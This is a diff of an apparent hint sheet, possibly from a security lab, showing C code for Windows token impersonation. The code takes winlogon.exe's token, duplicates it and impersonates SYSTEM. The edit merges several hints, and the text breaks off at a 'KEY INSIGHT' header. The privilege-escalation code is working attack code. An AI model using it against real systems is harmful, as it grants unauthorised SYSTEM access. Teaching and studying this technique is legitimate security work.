@@ -1,26 +1,19 @@
 === HINT 1: Find target process ===
 DWORD pid = find_process("winlogon.exe");
 
-=== HINT 2: Open and steal token ===
+=== HINT 2: Open process + steal token ===
 HANDLE hProc  = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
 HANDLE hToken = NULL;
 OpenProcessToken(hProc, TOKEN_DUPLICATE, &hToken);
 CloseHandle(hProc);
 
-=== HINT 3: Duplicate token ===
+=== HINT 3: Duplicate, impersonate, verify, revert ===
 HANDLE hDupToken = NULL;
 DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
     SecurityImpersonation, TokenImpersonation, &hDupToken);
 CloseHandle(hToken);
-
-=== HINT 4: Impersonate ===
 ImpersonateLoggedOnUser(hDupToken);
-// Now current thread is SYSTEM
-
-=== HINT 5: Verify + revert ===
-char user[128]; DWORD len = sizeof(user);
-GetUserNameA(user, &len);
-printf("impersonating: %s\n", user);  // "SYSTEM"
+// Now current thread is SYSTEM - verify with GetUserNameA ("SYSTEM")
 RevertToSelf();
 
 === KEY INSIGHT ===
